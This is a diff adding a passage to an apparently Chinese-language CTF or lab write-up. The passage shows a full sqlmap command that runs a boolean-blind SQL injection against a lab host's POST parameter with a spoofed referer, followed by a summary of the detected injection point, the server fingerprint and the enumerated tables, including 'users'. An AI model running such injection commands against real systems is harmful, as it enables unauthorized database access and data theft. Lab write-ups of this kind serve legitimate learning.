@@ -429,3 +429,39 @@ back-end DBMS: MySQL (MariaDB fork)
 --batch
 ```
 成功了
+```bash
+┌──(kali㉿kali)-[~/tmp/what]
+└─$ what  --md --raw
+
+──────────────────────────────────────────────────
+$ sqlmap -u "http://10.216.75.72/sl.php" \
+--method=POST \
+--data="query_id=1*" \
+--referer="http://10.216.75.72/secret.php" \
+--technique=B \
+--no-cast \
+--common-tables \
+--batch  (exit: 0)
+──────────────────────────────────────────────────
+
+该命令使用 sqlmap 对目标 URL http://10.216.75.72/sl.php 进行 SQL 注入测试，采用 POST 方法，参数 query_id=1*
+标记注入点，仅使用布尔盲注技术（--technique=B），并利用常见表名枚举（--common-tables）发现数据库中的表。
+
+执行结果：
+
+ • 成功检测到布尔盲注注入点（基于 MySQL RLIKE）。
+ • 获取目标信息：后端 DBMS 为 MySQL（MariaDB 分支），操作系统 Linux Debian，Web 应用 Apache 2.4.62。
+ • 通过枚举 common-tables.txt 词表（含 3625 个常用表名），单线程运行，最终发现 10 个表：
+    • div_experiment
+    • experiencia
+    • experiment
+    • experimental_data_set
+    • expression
+    • hostbenchmarks
+    • jos_vm_export
+    • maxcodexperiencia
+    • routerbenchmarks
+    • users
+ • 结果已保存至本地目录 /home/kali/.local/share/sqlmap/output/10.216.75.72。
+```
+原因是我也不知道，问的ai，过后再复盘一下。
